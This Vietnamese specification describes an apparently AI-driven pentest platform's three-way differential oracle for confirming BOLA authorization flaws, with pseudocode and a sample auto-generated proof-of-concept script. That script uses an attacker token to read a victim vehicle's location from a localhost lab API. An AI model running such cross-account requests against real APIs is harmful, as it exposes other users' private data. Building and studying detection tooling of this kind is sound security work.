# ĐẶC TẢ ORACLE XÁC MINH VI PHẠM VÀ CƠ CHẾ SINH BẰNG CHỨNG ĐỘC LẬP
## Document ID: SPEC-ORACLE-06

---

## 1. THUẬT TOÁN DIFFERENTIAL INVARIANT ORACLE 3 CHIỀU

Để khẳng định **100% không báo động giả (Zero False-Positive)** đối với lỗ hổng BOLA, hệ thống không bao giờ dựa vào suy đoán của LLM hay mã HTTP đơn lẻ. Thay vào đó, nó giải thuật toán so sánh 3 trạng thái:

```mermaid
graph TD
    subgraph ThreeWayRequests["Ma trận 3 Requests Đối chứng"]
        R1["Request 1: Req(Victim, Victim_Obj) -> Response chuẩn R_owner"]
        R2["Request 2: Req(Attacker, Victim_Obj) -> Response thử nghiệm R_cross"]
        R3["Request 3: Req(Attacker, Attacker_Obj) -> Response chuẩn R_attacker"]
    end

    ThreeWayRequests --> Sanitizer[Bộ làm sạch Header/Dynamic Fields Sanitizer]
    Sanitizer --> ASTParser[JSON AST / Token Tree Extractor]
    
    ASTParser --> InvariantCheck1{R_cross có HTTP 200?}
    InvariantCheck1 -->|Không| Reject1[Loại bỏ: Không vi phạm]
    InvariantCheck1 -->|Có| InvariantCheck2{SemanticMatch(R_cross, R_owner) > 0.85?}
    
    InvariantCheck2 -->|Không| Reject2[Loại bỏ: Khác biệt dữ liệu hoặc lỗi server]
    InvariantCheck2 -->|Có| InvariantCheck3{Dữ liệu rò rỉ có trường nhạy cảm của Victim?}
    
    InvariantCheck3 -->|Có| Confirm[XÁC NHẬN LỖ HỔNG BOLA 100%]
    InvariantCheck3 -->|Không| Reject3[Loại bỏ: Dữ liệu công khai]
```

### Mã giả thuật toán Oracle:
```python
import json
from typing import Dict, Any, Tuple

def differential_bola_oracle(
    r_owner: Dict[str, Any],     # Request hợp lệ của nạn nhân
    r_cross: Dict[str, Any],     # Request vượt quyền của kẻ tấn công
    r_attacker: Dict[str, Any],  # Request hợp lệ của kẻ tấn công
    sensitive_keys: set
) -> Tuple[bool, float, str]:
    
    # 1. Điều kiện tiên quyết: Request chéo phải thành công
    if r_cross.get("status_code") != 200:
        return False, 0.0, "Cross-request failed (not 200)"
        
    # 2. Loại bỏ các trường động gây nhiễu
    dynamic_noise = {"timestamp", "date", "trace_id", "request_id", "nonce", "server_time"}
    clean_owner = {k: v for k, v in r_owner.get("body", {}).items() if k not in dynamic_noise}
    clean_cross = {k: v for k, v in r_cross.get("body", {}).items() if k not in dynamic_noise}
    clean_attacker = {k: v for k, v in r_attacker.get("body", {}).items() if k not in dynamic_noise}

    # 3. Tính độ tương đồng cấu trúc & dữ liệu giữa Cross và Owner
    matching_keys = set(clean_owner.keys()).intersection(set(clean_cross.keys()))
    if not matching_keys:
        return False, 0.0, "Empty or incompatible JSON payload"

    matching_values = sum(1 for k in matching_keys if clean_owner[k] == clean_cross[k])
    similarity = matching_values / len(matching_keys)

    # 4. Kiểm tra việc rò rỉ dữ liệu định danh riêng của nạn nhân
    leaked_sensitive = [k for k in sensitive_keys if k in clean_cross and clean_cross[k] == clean_owner.get(k)]

    if similarity >= 0.85 and leaked_sensitive:
        return True, similarity, f"Confirmed BOLA: Leaked {leaked_sensitive} with similarity {similarity:.2f}"

    return False, similarity, "Similarity insufficient or no sensitive data leaked"
```

---

## 2. QUY CHUẨN SINH MÃ BẰNG CHỨNG TÁI LẬP (REPRODUCIBLE POC SPECIFICATION)

Khi một lỗ hổng được xác nhận, hệ thống tự động sinh ra một file mã nguồn Python độc lập (`reproduce_poc.py`) có thể chạy ở bất kỳ máy tính nào không cần cài framework Agent:

```python
# Tự động sinh bởi Agentic Pentest Platform
# Vulnerability: Broken Object Level Authorization (CWE-639)
# Target: http://localhost:8888/identity/api/v2/vehicle/c636f1b1-2292-4f32-845f-4d9435b5a796/location

import requests

ATTACKER_TOKEN = "eyJhbGciOiJIUzI1NiIsIn..."
VICTIM_VEHICLE_ID = "c636f1b1-2292-4f32-845f-4d9435b5a796"
URL = f"http://localhost:8888/identity/api/v2/vehicle/{VICTIM_VEHICLE_ID}/location"

headers = {
    "Authorization": f"Bearer {ATTACKER_TOKEN}",
    "Accept": "application/json"
}

response = requests.get(URL, headers=headers)

print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")

assert response.status_code == 200, "Exploit failed: Target responded with non-200"
assert "latitude" in response.json(), "Exploit failed: Private location data not found"
print("[+] VULNERABILITY CONFIRMED: BOLA successfully reproduced!")
```
